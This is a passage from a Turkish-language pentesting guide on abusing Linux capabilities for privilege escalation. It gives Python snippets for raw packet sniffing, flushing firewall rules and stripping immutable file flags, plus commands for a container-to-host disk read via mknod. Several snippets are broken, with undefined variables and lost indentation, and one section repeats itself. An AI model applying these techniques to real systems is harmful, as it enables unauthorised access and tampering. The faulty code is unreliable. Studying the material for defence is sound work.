# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) **İspanya'daki** en önemli siber güvenlik etkinliği ve **Avrupa'daki** en önemli etkinliklerden biridir. **Teknik bilgiyi teşvik etme misyonu** ile bu kongre, her disiplinde teknoloji ve siber güvenlik profesyonelleri için kaynayan bir buluşma noktasıdır.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**Bu, herhangi bir portta (hatta ayrıcalıklı olanlarda) dinlemenin mümkün olduğu anlamına gelir.** Bu yetenekle doğrudan ayrıcalıkları yükseltmek mümkün değildir.

**İkili ile örnek**

Eğer **`python`** bu yeteneğe sahipse, herhangi bir portta dinleyebilir ve hatta bu porttan başka bir porta bağlanabilir (bazı hizmetler belirli ayrıcalıklı portlardan bağlantılar gerektirir)

{% tabs %}
{% tab title="Dinle" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="Bağlan" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) yetkisi, süreçlerin **RAW ve PACKET soketleri oluşturmasına** izin verir, bu da onların rastgele ağ paketleri oluşturup göndermesine olanak tanır. Bu, konteynerleştirilmiş ortamlarda paket sahteciliği, trafik enjeksiyonu ve ağ erişim kontrollerinin atlatılması gibi güvenlik risklerine yol açabilir. Kötü niyetli aktörler, bu durumu konteyner yönlendirmesini etkilemek veya ana makine ağ güvenliğini tehlikeye atmak için kullanabilir, özellikle yeterli güvenlik duvarı korumaları yoksa. Ayrıca, **CAP_NET_RAW**, ayrıcalıklı konteynerlerin RAW ICMP istekleri aracılığıyla ping gibi işlemleri desteklemesi için kritik öneme sahiptir.

**Bu, trafiği dinlemenin mümkün olduğu anlamına gelir.** Bu yetki ile doğrudan ayrıcalıkları artırmak mümkün değildir.

**Binary ile örnek**

Eğer **`tcpdump`** binary'si bu yetkiye sahipse, ağ bilgilerini yakalamak için bunu kullanabileceksiniz.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Not edin ki eğer **environment** bu yeteneği veriyorsa, **`tcpdump`** kullanarak trafiği dinleyebilirsiniz.

**Binary 2 ile örnek**

Aşağıdaki örnek, "**lo**" (**localhost**) arayüzünün trafiğini yakalamak için yararlı olabilecek **`python2`** kodudur. Kod, [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) adresindeki "_The Basics: CAP-NET\_BIND + NET\_RAW_" laboratuvarından alınmıştır.
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) yetkisi, sahibine **ağ yapılandırmalarını değiştirme** gücü verir; bu, güvenlik duvarı ayarları, yönlendirme tabloları, soket izinleri ve maruz kalan ağ ad alanları içindeki ağ arayüzü ayarlarını içerir. Ayrıca, ağ arayüzlerinde **promiscuous mode**'u açma yeteneği sağlar, bu da ad alanları arasında paket dinlemeye olanak tanır.

**Binary ile örnek**

Diyelim ki **python binary**'sinin bu yetenekleri var.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**Bu, inode niteliklerini değiştirmenin mümkün olduğu anlamına gelir.** Bu yetenekle doğrudan ayrıcalıkları artırmak mümkün değildir.

**Binary ile örnek**

Bir dosyanın değiştirilemez olduğunu ve python'un bu yeteneğe sahip olduğunu bulursanız, **değiştirilemez niteliği kaldırabilir ve dosyayı değiştirilebilir hale getirebilirsiniz:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
Genellikle bu değiştirilemez özellik şu şekilde ayarlanır ve kaldırılır:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html), `chroot(2)` sistem çağrısının yürütülmesini sağlar ve bu, bilinen güvenlik açıkları aracılığıyla `chroot(2)` ortamlarından kaçışa olanak tanıyabilir:

* [Çeşitli chroot çözümlerinden nasıl çıkılır](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: chroot kaçış aracı](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html), belirli donanım platformları için özelleştirilmiş `LINUX_REBOOT_CMD_RESTART2` gibi komutlar da dahil olmak üzere sistem yeniden başlatmaları için `reboot(2)` sistem çağrısının yürütülmesine izin verir. Ayrıca, `kexec_load(2)` ve Linux 3.17'den itibaren yeni veya imzalı çökme çekirdeklerini yüklemek için `kexec_file_load(2)` kullanımını da sağlar.

## CAP\_SYSLOG

[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html), Linux 2.6.37'de daha geniş **CAP_SYS_ADMIN**'den ayrılmıştır ve `syslog(2)` çağrısını kullanma yetkisini özel olarak vermektedir. Bu yetenek, `kptr_restrict` ayarı 1 olduğunda, çekirdek adreslerinin `/proc` ve benzeri arayüzler aracılığıyla görüntülenmesini sağlar. Linux 2.6.39'dan itibaren, `kptr_restrict` için varsayılan değer 0'dır, bu da çekirdek adreslerinin açığa çıktığı anlamına gelir; ancak birçok dağıtım bunu güvenlik nedenleriyle 1 (uid 0 dışındaki adresleri gizle) veya 2 (her zaman adresleri gizle) olarak ayarlamaktadır.

Ayrıca, **CAP_SYSLOG**, `dmesg_restrict` 1 olarak ayarlandığında `dmesg` çıktısına erişim sağlar. Bu değişikliklere rağmen, **CAP_SYS_ADMIN**, tarihsel nedenlerden dolayı `syslog` işlemlerini gerçekleştirme yeteneğini korumaktadır.

## CAP\_MKNOD

[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html), `mknod` sistem çağrısının işlevselliğini, normal dosyalar, FIFO'lar (adlandırılmış borular) veya UNIX alan soketleri oluşturmanın ötesine taşır. Özellikle, aşağıdakiler de dahil olmak üzere özel dosyaların oluşturulmasına izin verir:

- **S_IFCHR**: Terminal gibi karakter özel dosyaları.
- **S_IFBLK**: Diskler gibi blok özel dosyaları.

Bu yetenek, cihaz dosyaları oluşturma yeteneğine ihtiyaç duyan süreçler için gereklidir ve karakter veya blok cihazları aracılığıyla doğrudan donanım etkileşimini kolaylaştırır.

Bu, varsayılan bir docker yeteneğidir ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Bu yetenek, aşağıdaki koşullar altında ana makinede ayrıcalık yükseltmelerine (tam disk okuma yoluyla) izin verir:

1. Ana makineye başlangıç erişimine sahip olmak (Ayrıcalıksız).
2. Konteynere başlangıç erişimine sahip olmak (Ayrıcalıklı (EUID 0) ve etkili `CAP_MKNOD`).
3. Ana makine ve konteyner aynı kullanıcı ad alanını paylaşmalıdır.

**Konteynerde Bir Blok Cihazı Oluşturma ve Erişim Sağlama Adımları:**

1. **Ana Makinede Standart Kullanıcı Olarak:**
- `id` ile mevcut kullanıcı kimliğinizi belirleyin, örneğin, `uid=1000(standartuser)`.
- Hedef cihazı belirleyin, örneğin, `/dev/sdb`.

2. **Konteyner İçinde `root` Olarak:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Ana Makinede:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Bu yaklaşım, standart kullanıcının `/dev/sdb`'den veri okuma ve erişim sağlama imkanı tanır, bu da paylaşılan kullanıcı ad alanları ve cihaz üzerindeki izinlerin istismarını içerir.

### CAP\_SETPCAP

**CAP_SETPCAP**, bir sürecin **başka bir sürecin yetenek setlerini değiştirmesine** olanak tanır ve böylece etkili, miras alınabilir ve izin verilen setlerden yeteneklerin eklenmesine veya kaldırılmasına izin verir. Ancak, bir süreç yalnızca kendi izin verilen setinde sahip olduğu yetenekleri değiştirebilir, bu da başka bir sürecin ayrıcalıklarını kendi seviyesinin ötesine yükseltmesini engeller. Son zamanlardaki çekirdek güncellemeleri bu kuralları sıkılaştırmış, `CAP_SETPCAP`'ı yalnızca kendi veya alt süreçlerinin izin verilen setlerindeki yetenekleri azaltmakla sınırlı hale getirmiştir; bu, güvenlik risklerini azaltmayı amaçlamaktadır. Kullanım, etkili set içinde `CAP_SETPCAP` ve izin verilen set içinde hedef yeteneklere sahip olmayı gerektirir; değişiklikler için `capset()` kullanılmalıdır. Bu, `CAP_SETPCAP`'ın temel işlevini ve sınırlamalarını özetler, ayrıcalık yönetimi ve güvenlik artırımı konusundaki rolünü vurgular.

**`CAP_SETPCAP`**, bir sürecin **başka bir sürecin yetenek setlerini değiştirmesine** olanak tanıyan bir Linux yeteneğidir. Diğer süreçlerin etkili, miras alınabilir ve izin verilen yetenek setlerinden yetenek ekleme veya kaldırma yeteneği verir. Ancak, bu yeteneğin nasıl kullanılacağına dair bazı kısıtlamalar vardır.

`CAP_SETPCAP`'a sahip bir süreç **yalnızca kendi izin verilen yetenek setinde bulunan yetenekleri verebilir veya kaldırabilir**. Diğer bir deyişle, bir süreç, kendisinde bulunmayan bir yeteneği başka bir sürece veremez. Bu kısıtlama, bir sürecin başka bir sürecin ayrıcalıklarını kendi ayrıcalık seviyesinin ötesine yükseltmesini engeller.

Ayrıca, son zamanlardaki çekirdek sürümlerinde, `CAP_SETPCAP` yeteneği **daha da kısıtlanmıştır**. Artık bir sürecin diğer süreçlerin yetenek setlerini keyfi olarak değiştirmesine izin vermemektedir. Bunun yerine, **bir sürecin yalnızca kendi izin verilen yetenek setindeki veya alt süreçlerinin izin verilen yetenek setindeki yetenekleri azaltmasına izin verilmektedir**. Bu değişiklik, yetenekle ilişkili potansiyel güvenlik risklerini azaltmak için getirilmiştir.

`CAP_SETPCAP`'ı etkili bir şekilde kullanmak için, yeteneği etkili yetenek setinizde ve hedef yetenekleri izin verilen yetenek setinizde bulundurmanız gerekir. Daha sonra, diğer süreçlerin yetenek setlerini değiştirmek için `capset()` sistem çağrısını kullanabilirsiniz.

Özetle, `CAP_SETPCAP`, bir sürecin diğer süreçlerin yetenek setlerini değiştirmesine olanak tanır, ancak kendisinde bulunmayan yetenekleri veremez. Ayrıca, güvenlik endişeleri nedeniyle, son zamanlardaki çekirdek sürümlerinde yalnızca kendi izin verilen yetenek setindeki veya alt süreçlerinin izin verilen yetenek setlerindeki yetenekleri azaltmaya izin verecek şekilde işlevselliği sınırlanmıştır.

## Referanslar

**Bu örneklerin çoğu** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com) **laboratuvarlarından alınmıştır, bu nedenle bu privesc tekniklerini uygulamak istiyorsanız bu laboratuvarları öneririm.**

**Diğer referanslar**:

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) **İspanya'daki en ilgili siber güvenlik etkinliği** ve **Avrupa'daki en önemli** etkinliklerden biridir. **Teknik bilgiyi teşvik etme misyonuyla**, bu kongre, her disiplinde teknoloji ve siber güvenlik profesyonelleri için kaynayan bir buluşma noktasıdır.

{% embed url="https://www.rootedcon.com/" %}
{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
</details>
{% endhint %}
